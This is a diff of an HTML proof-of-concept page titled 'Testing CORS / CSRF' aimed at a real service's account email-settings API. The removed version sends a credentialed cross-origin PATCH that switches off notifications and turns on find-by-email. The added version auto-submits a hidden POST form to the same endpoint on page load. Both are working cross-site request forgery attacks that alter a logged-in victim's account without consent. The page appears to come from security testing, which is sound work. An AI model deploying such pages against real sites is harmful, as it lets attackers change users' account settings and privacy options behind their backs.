@@ -1,24 +1,8 @@
 <!DOCTYPE html>
 <html>
-<body>
-<h1>Testing CORS / CSRF</h1>
-<script>
-fetch("https://www.myfitnesspal.com/api/services/account/email_settings", {
-    method: "PATCH",
-    credentials: "include", // force cookies to be sent
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      ep: { for_messages: false },
-      enews: { announcement: false },
-      pref: { find_by_email: true }
-    })
-})
-.then(r => {
-    document.body.innerHTML += "<p>Response: " + r.status + "</p>";
-})
-.catch(e => {
-    document.body.innerHTML += "<p>Error: " + e + "</p>";
-});
-</script>
+<body onload="document.forms[0].submit()">
+<form action="https://www.myfitnesspal.com/api/services/account/email_settings" method="POST">
+  <input type="hidden" name="test" value="1">
+</form>
 </body>
 </html>
